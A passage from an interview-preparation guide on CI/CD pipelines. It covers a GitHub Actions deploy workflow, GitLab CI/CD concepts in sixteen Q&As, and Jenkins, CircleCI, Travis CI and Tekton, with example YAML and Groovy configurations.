    branches: [main]

permissions:
  contents: read

concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ghcr.io/acme/app:${{ github.sha }}
    permissions:
      contents: read
      packages: write
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t ghcr.io/acme/app:${{ github.sha }} .
      - run: docker push ghcr.io/acme/app:${{ github.sha }}   # build ONCE, tag by SHA

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    permissions:
      id-token: write            # OIDC, no stored keys
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-staging
          aws-region: eu-west-1
      - run: ./deploy.sh ${{ needs.build.outputs.image }}   # promote same image

  deploy-prod:
    needs: [build, deploy-staging]
    runs-on: ubuntu-latest
    environment: production        # required reviewers gate this job
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-prod
          aws-region: eu-west-1
      - run: ./deploy.sh ${{ needs.build.outputs.image }}   # SAME artifact to prod
```

Design points to call out: **build once** — the image is tagged by git SHA and the *same* image promotes through staging to prod (no rebuild per environment). **OIDC everywhere** — `id-token: write` + assume-role means zero long-lived AWS keys. **Least privilege** — a read-only floor, elevated only where a job needs it. **The prod gate** — `environment: production` with required reviewers pauses for a logged human approval (Continuous Delivery, not blind Continuous Deployment). **Concurrency** serialises deploys so two never race. Add smoke tests after staging and an automated rollback trigger and this is a production-grade pipeline.

## GitLab CI/CD

### Summary

**What this topic covers**

GitLab CI/CD is the pipeline system built into GitLab — and the main alternative to GitHub Actions you'll be asked to compare. Where Actions is a marketplace of composable actions bolted onto GitHub, GitLab CI is a **single integrated platform**: source, CI/CD, container registry, environments, and review apps all in one product, driven by one file. This topic covers the `.gitlab-ci.yml` model, **stages** (sequential phases) vs **jobs** (parallel within a stage), the anatomy of a job (`script`, `image`, `stage`, `rules`, `artifacts`, `tags`), **`rules`** (the modern replacement for `only/except`), **`needs`** (the DAG that breaks free of stage ordering for speed), **runners and executors** (docker/shell/kubernetes; tag-based job selection), **`include`/templates/`extends`** for DRY, **artifacts vs cache**, **environments and review apps** (ephemeral per-MR environments — a standout GitLab feature), the built-in **Container Registry** and `CI_*` variables, **child/parent pipelines**, `workflow:rules`, merge request pipelines and merge trains, and how it all compares to GitHub Actions. The 16 questions run from "what's the `.gitlab-ci.yml` model" to designing a multi-stage build/test/deploy pipeline with manual prod gates.

**Mental model**

Think **stages as a timeline, jobs as parallel lanes, `needs` as shortcuts**. By default a pipeline is a sequence of stages (`build → test → deploy`); every job belongs to a stage; all jobs in a stage run in parallel and the next stage waits for the whole previous stage to go green. That's the simple mental model — and it's often too slow, because a job might only depend on one upstream job, not the entire previous stage. `needs:` turns the pipeline into a **DAG**: a job starts the moment its specific dependencies finish, ignoring stage boundaries, so unrelated work doesn't block each other. The second half of the model is **everything integrated**: the same file that defines your build also defines which runner executes it (by tags), where artifacts go, which environment a deploy targets, and whether GitLab spins up a **review app** for the merge request. You're not assembling third-party pieces; you're configuring one platform. Hold "stages sequence, jobs parallelise, `needs` optimises, and the platform owns the whole lifecycle" and GitLab CI clicks into place.

**Key terms**

- **`.gitlab-ci.yml`** — the pipeline definition at the repo root (or split via `include`).
- **Stage** — a named phase; stages run **sequentially**, jobs within one run **in parallel**.
- **Job** — a unit of work: `script`, optional `image`, `stage`, `rules`, `artifacts`, `tags`.
- **`rules`** — conditions (`if`/`changes`/`exists`, `when:`) deciding whether and how a job runs; replaces `only/except`.
- **`needs`** — declares job-level dependencies, forming a DAG that runs jobs as soon as deps finish.
- **Runner** — the agent executing jobs; shared/group/project scoped; picks jobs by matching **tags**.
- **Executor** — how a runner runs a job: `docker`, `shell`, `kubernetes`, etc.
- **`include`** — pull in config from `local`/`project`/`remote`/`template` for DRY.
- **`extends` / anchors** — reuse job config blocks within a file.
- **Artifacts** — files passed between stages (`artifacts:paths`, `reports`, `expire_in`).
- **Cache** — reused dependency store keyed by `cache:key`; speed, not correctness.
- **Environment / review app** — a tracked deploy target (`environment:`); review apps are ephemeral per-MR environments.
- **Predefined variables** — `CI_COMMIT_SHA`, `CI_REGISTRY`, etc., injected by GitLab.

**Why interviewers ask this**

GitLab questions test both **tool fluency** and the ability to **compare platforms** — a senior signal because it shows you choose CI/CD deliberately rather than using whatever's in front of you. The `stages` vs `needs` question is the classic depth probe: a junior describes stages; a senior explains how `needs` turns a slow sequential pipeline into a fast DAG. `rules` vs the deprecated `only/except` reveals whether you've kept current. And **review apps** — ephemeral environments spun up per merge request — are a feature GitLab does especially well; knowing them signals you've used GitLab's integrated strengths, not just run scripts in it. Interviewers also like the compare-and-contrast: GitLab's single integrated platform (registry, environments, review apps built in) vs GitHub's marketplace-and-composition model. A candidate who can say *when* they'd pick each is demonstrating architectural judgement.

**Common confusions**

- "Jobs run in the order I write them" — no; order is by **stage**, and jobs in a stage run **in parallel**. `needs` overrides stage order.
- "`needs` and `stages` conflict" — they complement: stages give a default order, `needs` lets specific jobs jump ahead into a DAG.
- "`only/except` is the current way" — it's legacy; **`rules`** is the modern, more expressive control.
- "Artifacts and cache are the same" — artifacts **pass build outputs between stages** (reliable); cache **speeds dependency installs** (best-effort).
- "Any runner can run any job" — a runner only picks jobs whose **tags** it matches; mismatched tags = stuck pipeline.
- "Review apps are just staging" — they're **ephemeral, per-MR** environments, torn down when the MR closes.

**What follows from this topic**

GitLab CI is the second data point that turns tool knowledge into **portable CI/CD understanding**: stages/jobs map to Actions' jobs, `needs` is the same DAG idea as Actions' `needs`, `rules` mirror `if:` conditionals, and environments-with-manual-gates are the same Continuous-Delivery approval pattern seen in Actions environments. Review apps preview the ephemeral-preview-environment idea that shows up in modern PaaS deploys. The integrated Container Registry connects to the artifact/immutable-image theme (build once, promote the same image). And `workflow:rules` and merge-train concepts feed directly into the "keep main green, merge safely" discipline at the heart of CI. Once you can map GitLab's vocabulary onto the platform-agnostic concepts, you can pick up Jenkins, CircleCI, or Buildkite by translation rather than relearning.

### Q1. Describe the `.gitlab-ci.yml` model.

GitLab CI is driven by a single **`.gitlab-ci.yml`** at the repo root (optionally split via `include`). It defines **stages** and **jobs**; GitLab reads it on every push and runs a pipeline.

```yaml
stages: [build, test, deploy]

build-app:
  stage: build
  image: node:20
  script:
    - npm ci
    - npm run build
  artifacts:
    paths: [dist/]

unit-test:
  stage: test
  image: node:20
  script:
    - npm ci
    - npm test
```

Top-level keys configure the pipeline (`stages`, `workflow`, `include`, `default`); everything else is a **job** with a `script`. A job runs on a runner, in a container defined by `image:`, and can produce `artifacts`. Simple, declarative, and all in one file.

### Q2. Explain stages and how jobs relate to them.

**Stages** are ordered phases declared globally; each **job** is assigned to a stage. The rule: **stages run sequentially, jobs within a stage run in parallel**, and a stage only starts once the previous stage fully succeeds.

```yaml
stages: [build, test, deploy]

compile:   { stage: build,  script: [make build] }
unit:      { stage: test,   script: [make test-unit] }
lint:      { stage: test,   script: [make lint] }        # runs parallel to unit
ship:      { stage: deploy, script: [make deploy] }
```

Here `unit` and `lint` run **together** in the `test` stage; `deploy` waits for **both** to pass. If any job in a stage fails, later stages don't run (barring `allow_failure`). This gives you a clean build → test → deploy timeline out of the box.

### Q3. What defines a job? Walk through its key keywords.

A **job** is any top-level entry with a `script`. Its common keywords:

- **`script`** — the commands to run (required); `before_script`/`after_script` wrap it.
- **`image`** — the Docker image the job runs in (with the docker executor).
- **`stage`** — which stage it belongs to (defaults to `test`).
- **`rules`** — whether and how the job runs.
- **`artifacts`** — files to save and pass on (with `expire_in`, `reports`).
- **`needs`** — job dependencies for DAG execution.
- **`tags`** — which runner(s) can pick it up.
- **`variables`** — job-scoped variables.

```yaml
deploy-staging:
  stage: deploy
  image: alpine:3.20
  tags: [docker, linux]
  needs: [build-app]
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
  script:
    - ./deploy.sh staging
  environment:
    name: staging
```

### Q4. What are `rules` and why did they replace `only/except`?

**`rules`** control **whether and how** a job is added to the pipeline, using `if`, `changes`, and `exists` conditions plus a `when:` action. They replaced the older `only/except` because rules are far more expressive — you can combine conditions, set `when: manual`, attach variables, and control `allow_failure` per rule.

```yaml
deploy-prod:
  stage: deploy
  script: [./deploy.sh prod]
  rules:
    - if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
      when: manual                      # main pushes: manual gate
    - if: '$CI_COMMIT_BRANCH != "main"'
      when: never                       # never elsewhere

build-docs:
  script: [make docs]
  rules:
    - changes: [docs/**/*]              # only when docs change
```

`when:` values: `on_success` (default), `manual` (button to trigger), `always`, `never`, `delayed`. Rules are evaluated in order; the first match wins. `only/except` still works but is legacy — use `rules`.

### Q5. What is `needs` and how does it speed up pipelines?

By default a job waits for its **entire previous stage**. **`needs`** breaks that: a job starts the moment its **specific** dependencies finish, turning the pipeline into a **DAG (directed acyclic graph)**.

```yaml
stages: [build, test, deploy]

build-api:  { stage: build, script: [make api] }
build-web:  { stage: build, script: [make web] }

test-api:
  stage: test
  needs: [build-api]        # starts as soon as build-api is done
  script: [make test-api]

deploy-web:
  stage: deploy
  needs: [build-web]        # doesn't wait for test-api at all
  script: [make deploy-web]
```

Without `needs`, `test-api` would wait for `build-web` too (same stage boundary). With `needs`, independent chains run as fast as their own dependencies allow. `needs` can also pull **artifacts** from just the jobs it depends on. This is the single biggest pipeline-speed lever in GitLab CI.

### Q6. Explain GitLab runners and executors.

A **runner** is the agent that executes jobs. Runners are scoped:

- **Shared** — available to all projects in the instance (GitLab.com's hosted runners).
- **Group** — shared across projects in a group.
- **Project** — dedicated to one project.

A runner uses an **executor** to actually run the job:

- **`docker`** — each job runs in a fresh container from the job's `image:` (clean, isolated, most common).
- **`shell`** — runs directly on the runner host (fast, but no isolation — state leaks between jobs).
- **`kubernetes`** — spins up a pod per job (elastic, cloud-native, autoscaling).

Runners pick jobs by matching **tags**: a job with `tags: [docker, linux]` only runs on a runner registered with those tags. Mismatched tags are a classic "pipeline stuck pending" cause — the job has no runner willing to take it.

### Q7. How do `include`, templates, and `extends` keep pipelines DRY?

GitLab offers several reuse mechanisms:

- **`include`** pulls config from elsewhere:
  - `include:local` — another file in the same repo.
  - `include:project` — a file from another GitLab project (central pipeline library).
  - `include:remote` — a URL.
  - `include:template` — GitLab's built-in templates (SAST, Dependency Scanning, etc.).
- **`extends`** — a job inherits keys from a hidden base job (prefixed `.`).
- **YAML anchors** (`&`/`*`) — in-file reuse of a block.
- **CI/CD components** — the modern, versioned, parameterised reusable units published to a catalog.

```yaml
include:
  - template: Security/SAST.gitlab-ci.yml
  - project: acme/ci-templates
    file: /node.yml

.node-base:
  image: node:20
  before_script: [npm ci]

test:
  extends: .node-base
  script: [npm test]
```

A platform team publishes standard jobs via `include:project` or components; every repo `extends` or includes them — the GitLab equivalent of reusable workflows.

### Q8. Compare artifacts and cache in GitLab CI.

Both persist files, but for **different purposes**:

- **Artifacts** — outputs passed **between stages/jobs** and surfaced in the UI. Reliable within the pipeline. Use `artifacts:paths`, `artifacts:reports` (test/coverage reports GitLab parses), and `artifacts:expire_in`.
- **Cache** — a **speed optimisation** for dependencies reused across pipelines, keyed by `cache:key`. Best-effort — may be missing.

```yaml
build:
  stage: build
  script: [npm ci, npm run build]
  cache:
    key:
      files: [package-lock.json]     # invalidate when deps change
    paths: [node_modules/]
  artifacts:
    paths: [dist/]                    # pass the build output onward
    expire_in: 1 week
    reports:
      junit: junit.xml
```

Rule of thumb: **artifacts move build outputs forward; cache speeds up installs**. Don't rely on cache for correctness — a downstream stage must get its inputs from artifacts, not from a cache that might be gone.

### Q9. What are environments and review apps?

An **environment** is a named, tracked deployment target. Declaring `environment:` on a deploy job records deployments, shows what's live where, and enables rollback from the UI.

```yaml
deploy-prod:
  stage: deploy
  script: [./deploy.sh prod]
  environment:
    name: production
    url: https://app.acme.com
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: manual        # manual gate for prod
```

**Review apps** are the standout feature: an **ephemeral environment spun up per merge request** so reviewers see the actual running change, torn down when the MR closes.

```yaml
review:
  stage: deploy
  script: [./deploy.sh review-$CI_COMMIT_REF_SLUG]
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.review.acme.com
    on_stop: stop-review          # cleanup job
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
```

Every MR gets its own live preview URL — a genuinely powerful review workflow that GitLab makes first-class.

### Q10. How does the built-in Container Registry work with CI?

GitLab ships an integrated **Container Registry** per project, and CI exposes it through predefined variables so you can build and push images with no external registry setup:

- `CI_REGISTRY` — the registry host.
- `CI_REGISTRY_IMAGE` — this project's image path.
- `CI_REGISTRY_USER` / `CI_REGISTRY_PASSWORD` — auto-provided credentials (or `CI_JOB_TOKEN`).

```yaml
build-image:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA" .
    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
```

Tagging by `CI_COMMIT_SHA` gives an **immutable, per-commit image** you build once and promote through environments — no external registry, no separately managed credentials.

### Q11. What are predefined CI variables, and how do custom/masked/protected variables work?

GitLab injects many **predefined variables** into every job: `CI_COMMIT_SHA`, `CI_COMMIT_REF_NAME`/`SLUG`, `CI_PIPELINE_SOURCE`, `CI_PROJECT_PATH`, `CI_REGISTRY_IMAGE`, `CI_JOB_TOKEN`, and dozens more — the run's metadata, ready to use.

You add **custom variables** in the UI (Settings → CI/CD → Variables) or in `variables:`, with two important flags:

- **Masked** — the value is hidden (`[MASKED]`) in job logs. Requires the value to meet masking rules (length/charset).
- **Protected** — the variable is only exposed to jobs running on **protected branches/tags**. This is how you keep prod credentials out of feature-branch and fork pipelines.

```yaml
variables:
  DEPLOY_ENV: staging          # plain, in-file
# DEPLOY_TOKEN set in UI as Masked + Protected → only on protected branches
```

Masked + Protected together are the standard way to guard production secrets: hidden in logs and unreachable from untrusted branches.

### Q12. What are child/parent pipelines and triggers?

A **parent pipeline** can spawn **child pipelines** — separate pipelines defined in their own YAML, triggered from a job. This keeps large or monorepo configs modular and enables **dynamic pipelines** (generate the child YAML at runtime).

```yaml
trigger-api:
  stage: build
  trigger:
    include: services/api/.gitlab-ci.yml
    strategy: depend        # parent waits on child result

trigger-web:
  stage: build
  trigger:
    include: services/web/.gitlab-ci.yml
```

Uses: **monorepos** — each service has its own child pipeline, triggered only when its paths change; **dynamic generation** — a job writes a `.gitlab-ci.yml` as an artifact and triggers it (pipelines tailored to what changed); and **multi-project triggers** (`trigger: project: other/repo`) to kick a downstream project's pipeline. `strategy: depend` makes the parent job's status reflect the child's outcome.

### Q13. Compare DAG (`needs`) with the default stage-based flow. When does each win?

| | Stage-based (default) | DAG (`needs`) |
|---|---|---|
| Ordering | Sequential by stage | By explicit dependencies |
| A job waits for | The **whole** previous stage | Only its **`needs`** |
| Speed | Slower (stage barriers) | Faster (no false waits) |
| Simplicity | Very simple to reason about | More wiring, more parallelism |
| Best for | Small linear pipelines | Wide pipelines with independent chains |

Stage-based flow is fine when the pipeline is genuinely linear and small — the mental model is trivial. `needs` wins the moment you have **independent chains** (build-api→test-api alongside build-web→deploy-web) that shouldn't block each other on stage barriers. In practice most non-trivial pipelines mix both: keep stages for a readable structure, then add `needs` to let independent work overtake. The cost of `needs` is a bit more explicit wiring; the payoff is wall-clock time.

### Q14. What does `workflow:rules` control?

`rules` on a job decide whether that **job** runs; **`workflow:rules`** decide whether the **entire pipeline** is created at all. It's the top-level gate that prevents duplicate or unwanted pipelines.

```yaml
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'   # MR pipelines
    - if: '$CI_COMMIT_BRANCH == "main"'                    # main pushes
    - if: '$CI_COMMIT_TAG'                                  # tags
    - when: never                                           # nothing else
```

The classic use is avoiding **duplicate pipelines** — without a workflow rule, opening an MR on a branch can trigger both a branch pipeline and a merge-request pipeline for the same commit. `workflow:rules` lets you say "run MR pipelines and main/tags, and nothing else," so each change produces exactly one pipeline. It's the first thing to reach for when someone complains about double pipelines.

### Q15. Explain merge request pipelines and merge trains.

**Merge request pipelines** run in the **context of the merge request** rather than a plain branch, so results attach directly to the MR and you can require them before merge (`CI_PIPELINE_SOURCE == "merge_request_event"`). A variant, **merged results pipelines**, runs against a preview of the **post-merge** code — testing the result of merging into the target, not just the branch in isolation, which catches "green on branch, broken after merge" surprises.

**Merge trains** go further for busy repos: when several MRs are ready, GitLab queues them and runs each against the cumulative result of the ones ahead in the train. Only if a train run passes does the MR merge; a failure is ejected without breaking the target branch. This solves the concurrency problem where individually-green MRs collectively break `main` after they all merge. It's GitLab's mechanism for **keeping main green under high merge throughput** — the same concern as CI's "integrate frequently without breaking the mainline."

### Q16. Compare GitLab CI/CD to GitHub Actions, and sketch a multi-stage pipeline.

| | GitLab CI/CD | GitHub Actions |
|---|---|---|
| Philosophy | Single **integrated platform** | **Marketplace** + composition |
| Config | One `.gitlab-ci.yml` | Multiple workflow files |
| Reuse | `include`, `extends`, components | Actions, reusable workflows |
| Ordering | Stages + `needs` (DAG) | `needs` between jobs |
| Registry/environments | **Built in** (registry, review apps) | Via GHCR + environments |
| Runner selection | **Tags** | `runs-on` labels |
| Preview envs | **Review apps** (first-class) | Roll your own |

GitLab shines when you want everything in one product (registry, review apps, environments, scanning built in); Actions shines on GitHub-hosted OSS with a vast marketplace of composable actions. Pick GitLab for an integrated internal platform; Actions where you're already on GitHub and want ecosystem breadth.

A representative multi-stage pipeline:

```yaml
stages: [build, test, deploy]

variables:
  IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

build:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - docker build -t "$IMAGE" .          # build ONCE
    - docker push "$IMAGE"

test:
  stage: test
  image: node:20
  needs: [build]
  script: [npm ci, npm test]
  artifacts:
    reports: { junit: junit.xml }

deploy-staging:
  stage: deploy
  needs: [test]
  script: [./deploy.sh "$IMAGE" staging]   # promote same image
  environment: { name: staging, url: https://staging.acme.com }
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'

deploy-prod:
  stage: deploy
  needs: [deploy-staging]
  script: [./deploy.sh "$IMAGE" prod]      # SAME artifact to prod
  environment: { name: production, url: https://app.acme.com }
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: manual                          # manual prod gate (Continuous Delivery)
```

Build once and tag by SHA, promote that same image through staging to prod, gate prod with `when: manual`, and use **protected** variables so prod credentials never reach non-protected branches.
## Other CI Systems

### Summary

**What this topic covers**

The CI/CD tool landscape beyond GitHub Actions and GitLab CI — the incumbents, the challengers, and the Kubernetes-native new wave. The 15 questions here cover **Jenkins** (the self-hosted automation server that still runs a huge fraction of the world's pipelines), **CircleCI** and **Travis CI** (the cloud-hosted SaaS generation), **Tekton** and **Argo Workflows** (Kubernetes-native, CRD-driven), **Buildkite** (the hybrid model — SaaS control plane, your own agents), and the cloud-vendor offerings (**Azure DevOps Pipelines**, **AWS CodePipeline/CodeBuild**). More important than any single tool are the **decision axes** — managed SaaS vs self-hosted, container-native vs VM, ecosystem/marketplace, cost, and the security/compliance constraints that push regulated orgs toward self-hosting. The through-line across all of them is **pipeline-as-code**, and the failure mode common to all of them is insecure self-hosted runners/agents.

**Mental model**

Think of CI systems on two axes. The first is **where the control plane lives**: fully managed SaaS (CircleCI, Travis, GitHub Actions cloud) vs self-hosted (Jenkins, Tekton, GitLab self-managed) — with **hybrid** (Buildkite, self-hosted runners) as the middle ground where the vendor runs orchestration but *you* run the compute that touches your code and secrets. The second axis is **the execution substrate**: VM/host-based (classic Jenkins, Travis) vs container-native (most modern tools) vs **Kubernetes-native** (Tekton, Argo), where every step is a pod and the pipeline itself is a set of custom resources (CRDs) reconciled by the cluster. Layered on top is the **VCS-integration trend**: Actions and GitLab CI win because the pipeline lives next to the code, triggered by the same events, with one permission model. When you evaluate a tool, don't ask "which is best" — ask "managed or self-hosted? container-native or not? how deep is the ecosystem? what does compliance force? what's the total cost including the humans who maintain it?" Jenkins is powerful *and* a maintenance tax; that tension is the whole story.

**Key terms**

- **Jenkins controller/agent** — the controller schedules and stores config/history; agents (formerly "slaves") execute builds. The controller is a single point of failure and a juicy attack target.
- **Jenkinsfile** — pipeline-as-code for Jenkins, either **declarative** (structured, opinionated, `pipeline { stages { ... } }`) or **scripted** (full Groovy, powerful but a footgun).
- **Plugin ecosystem** — Jenkins' ~1,800 plugins are its superpower and its curse: they enable everything and rot, conflict, and open CVEs.
- **Orb (CircleCI)** — a reusable, versioned package of config (jobs/commands/executors), CircleCI's answer to marketplace actions.
- **Tekton Task/Pipeline** — Kubernetes CRDs; a Task is a sequence of steps (containers), a Pipeline wires Tasks into a DAG. Tekton is a *building block*, not a finished product.
- **Argo Workflows** — a K8s-native workflow engine (DAG or steps), each step a container/pod; often paired with **Argo CD** (GitOps) and **Argo Events**.
- **Buildkite agent** — you run the agents on your own infra; Buildkite SaaS only orchestrates — hybrid model, popular for scale and security.
- **Executor/runner** — the thing that actually runs a job (Docker, VM, shell, K8s). Self-hosted ones are the main security surface.
- **Pipeline-as-code** — pipeline definition lives in the repo, versioned with the code. The universal modern default.
- **Managed SaaS vs self-hosted** — vendor runs it vs you run it; trades convenience/cost for control/compliance.

**Why interviewers ask this**

Tool breadth is a proxy for platform maturity. A junior engineer knows the one CI system their current job uses; a senior platform engineer can compare Jenkins to GitHub Actions to Tekton and *justify a choice from constraints* — "we're regulated and can't send source to a SaaS, so self-hosted; we're already on Kubernetes, so Tekton/Argo rather than standing up Jenkins controllers." Interviewers also probe whether you understand *why* Jenkins is simultaneously everywhere and disliked — that reveals whether you've felt the maintenance pain firsthand. The strongest signal is separating the durable concept (pipeline-as-code, DAGs, artifacts, runners) from the tool-of-the-week, and treating "avoid lock-in" and "secure the runners" as first-class concerns rather than afterthoughts.

**Common confusions**

- "Jenkins is dead" — it isn't; it runs an enormous installed base and is still a sensible pick for complex self-hosted needs. It's *dated and high-maintenance*, not dead.
- "Tekton is a drop-in CI like Actions" — no; Tekton is a low-level building block. Teams usually put a layer (or Argo/Jenkins X) on top.
- "Argo Workflows and Argo CD are the same" — different tools. Workflows is a general workflow/CI engine; Argo CD is a GitOps continuous-delivery controller.
- "SaaS CI is always cheaper" — at scale, compute-minute billing and lack of control can make self-hosted (Buildkite/Jenkins on your own instances) cheaper.
- "Self-hosted runners are automatically more secure" — only if you isolate them. A shared, internet-exposed, over-privileged runner is *less* secure than a managed one.

**What follows from this topic**

Whichever tool you pick, the downstream concerns are identical: the **Build & Test Stages** topic (parallelization, caching, flaky tests, quality gates) applies to all of them, and the **Artifacts & Artifact Management** topic (build once, promote the same artifact) is tool-agnostic. Kubernetes-native tools (Tekton/Argo) connect directly to GitOps delivery (ArgoCD/Flux) covered in the deployment topics. Keep the concepts portable and the tool swappable.

### Q1. What is Jenkins and why is it still so widely used?

**Jenkins** is an open-source, self-hosted automation server — the original mainstream CI tool (forked from Hudson in 2011). You run it on your own infrastructure: a **controller** (schedules jobs, stores configuration and build history, serves the UI) and one or more **agents** (execute the actual builds, on VMs, containers, or bare metal).

Why it endures:

- **Ubiquity and inertia** — a massive installed base. Huge amounts of institutional pipeline logic are already in Jenkins.
- **Total control** — self-hosted, so it runs air-gapped, on-prem, behind strict firewalls; nothing leaves your network.
- **The plugin ecosystem** — ~1,800 plugins integrate with essentially anything. If a system exists, there's probably a Jenkins plugin for it.
- **Flexibility** — scripted Groovy pipelines can express almost arbitrary logic.

The catch: it's a **maintenance tax**. You patch it, secure it, scale the agents, manage plugin sprawl and their CVEs, and babysit a controller that's a single point of failure. Modern teams increasingly prefer VCS-integrated CI (Actions/GitLab) where the pipeline lives with the code and there's no server to run.

### Q2. Explain the Jenkins controller/agent architecture.

- **Controller** (historically "master") — the brain. It stores job config and build history, schedules builds, dispatches work to agents, runs the web UI and REST API, and hosts most plugins. It should ideally run **no build workloads itself** (running untrusted build steps on the controller is a serious security hole — they'd have access to credentials and config).
- **Agents** (historically "slaves") — the muscle. They connect to the controller (via SSH, JNLP/inbound, or dynamically provisioned as Docker/Kubernetes pods) and execute the build steps. You scale horizontally by adding agents, and you can label them (`linux`, `windows`, `gpu`) so jobs land on the right hardware.

Key operational points: the controller is a **single point of failure** and the **highest-value attack target** (it holds all credentials). Best practice is ephemeral agents (spun up per build, e.g. the Kubernetes plugin creates a pod per build and tears it down), keeping the controller lean and builds isolated.

### Q3. What is a Jenkinsfile, and what's the difference between declarative and scripted pipelines?

A **Jenkinsfile** is Jenkins' pipeline-as-code: the pipeline definition committed to the repo (rather than clicked together in the UI), so it's versioned and reviewed with the code.

Two syntaxes:

- **Declarative** — structured and opinionated. A `pipeline { }` block with `agent`, `stages`, `steps`, `post`. Easier to read, validated up front, the recommended default.
- **Scripted** — raw Groovy. Maximum power (loops, conditionals, arbitrary logic) but easy to abuse into unmaintainable spaghetti and a security risk.

Declarative example:

```groovy
pipeline {
  agent { label 'linux' }
  stages {
    stage('Build') {
      steps { sh './gradlew build' }
    }
    stage('Test') {
      steps { sh './gradlew test' }
    }
    stage('Deploy') {
      when { branch 'main' }
      steps { sh './deploy.sh' }
    }
  }
  post {
    failure { echo 'Build failed' }
  }
}
```

Prefer declarative; drop into a `script { }` block for the rare bit of Groovy you genuinely need.

### Q4. Jenkins has a huge plugin ecosystem. Why is that a double-edged sword?

The plugins are **why Jenkins can do anything** — SCM, cloud providers, notifications, test reporters, credential stores, deployment targets. Almost every integration you'd want already exists.

The downsides are real and chronic:

- **Security** — plugins are third-party code running inside the controller with access to credentials. Jenkins plugin CVEs are a steady stream; a huge share of Jenkins vulnerabilities come from plugins.
- **Dependency hell** — plugins depend on specific Jenkins and other-plugin versions; upgrades break things.
- **Rot** — many plugins are unmaintained. You end up pinned to old versions to avoid breakage, which then blocks security updates.
- **Config drift** — plugin state lives on the controller; reproducing an environment is hard (mitigated by Configuration-as-Code, JCasC).

The lesson: minimize plugins, pin and audit them, and treat the plugin set as a supply-chain surface. This maintenance burden is a big reason teams migrate off Jenkins.

### Q5. What are Jenkins Shared Libraries and when would you use them?

**Shared Libraries** let you factor common pipeline logic into a versioned Git repo that many Jenkinsfiles import — Jenkins' answer to reusable workflows/composite actions. You define custom steps (Groovy) under `vars/` and classes under `src/`, then load them:

```groovy
@Library('acme-ci@v2') _
buildAndDeploy(service: 'payments', env: 'staging')
```

Use them to **stop copy-pasting pipeline boilerplate** across dozens of repos: standardize the build/test/deploy flow, enforce org policy (security scans, approvals) in one place, and expose a small vocabulary of high-level steps so app teams write a 5-line Jenkinsfile instead of 200. The trade-off: a shared library becomes critical infrastructure — version it, test it, and be careful, because a bug ships to every pipeline at once.

### Q6. Why do many teams migrate off Jenkins, and what does that migration involve?

Motivations:

- **Maintenance burden** — running, patching, scaling, and securing controllers and agents is real, ongoing ops work.
- **Plugin security and rot** — the CVE treadmill.
- **Dated developer experience** — UI, Groovy DSL, and config feel old next to YAML-in-repo tools.
- **VCS integration** — teams want the pipeline next to the code with a unified permission model (Actions/GitLab).

Migration is rarely trivial because Jenkins pipelines accumulate bespoke Groovy and plugin-specific behavior:

1. **Inventory** the jobs, plugins, and shared-library logic actually in use.
2. **Reframe** pipelines as declarative stages (build → test → package → deploy) — the concepts port even when the syntax doesn't.
3. **Translate** to the target (GitHub Actions/GitLab CI/Tekton), replacing plugins with native features or marketplace actions.
4. **Re-home secrets** into the new platform's secret store / OIDC.
5. **Run in parallel** (strangler-fig) — migrate repo by repo, validating output, before decommissioning the Jenkins controller.

Don't attempt a big-bang cutover; migrate incrementally and keep old and new green side by side.

### Q7. What is CircleCI and what are orbs?

**CircleCI** is a cloud-hosted (with a self-hosted server option) CI/CD platform configured via `.circleci/config.yml`. Historically it built a reputation for **speed** (fast spin-up, good caching, generous parallelism) and a clean YAML config with first-class Docker support.

**Orbs** are its reusable-package system: versioned bundles of config — jobs, commands, and executors — published to a registry and imported into your config, analogous to GitHub Actions in the marketplace or CircleCI's take on shared libraries.

```yaml
version: 2.1
orbs:
  node: circleci/node@5.0.0
jobs:
  test:
    executor: node/default
    steps:
      - checkout
      - node/install-packages
      - run: npm test
workflows:
  build-test:
    jobs: [test]
```

Orbs let you drop in tested integrations (AWS, Slack, language toolchains) instead of hand-writing steps, which is CircleCI's main lever for reuse and reduced boilerplate.

### Q8. Whatever happened to Travis CI?

**Travis CI** was, for years, *the* CI for open source — the default `.travis.yml` on countless GitHub projects, free for public repos, dead simple to set up. It essentially popularized cloud CI for the OSS world.

Its decline is a cautionary tale about SaaS CI dependence:

- After acquisition (2019), there were **layoffs of core engineers** and a perceived drop in investment.
- A **2021 security incident** exposed secrets/tokens in logs for public-repo builds, damaging trust.
- **Pricing changes** removed much of the free OSS tier that had driven adoption.
- Meanwhile **GitHub Actions launched (2019)** — free, built into GitHub, right where the OSS code already lived — and the community migrated en masse.

The lesson for interviews: CI is critical infrastructure, and a SaaS provider's business/security decisions are your risk. It's an argument for pipeline-as-code (portable) and against deep lock-in.

### Q9. What is Tekton and how is it different from traditional CI?

**Tekton** is a **Kubernetes-native** CI/CD framework. Instead of a server with its own job model, Tekton defines pipelines as **Kubernetes custom resources (CRDs)**:

- **Step** — a single container command.
- **Task** — an ordered sequence of steps, run in one pod.
- **Pipeline** — a DAG of Tasks.
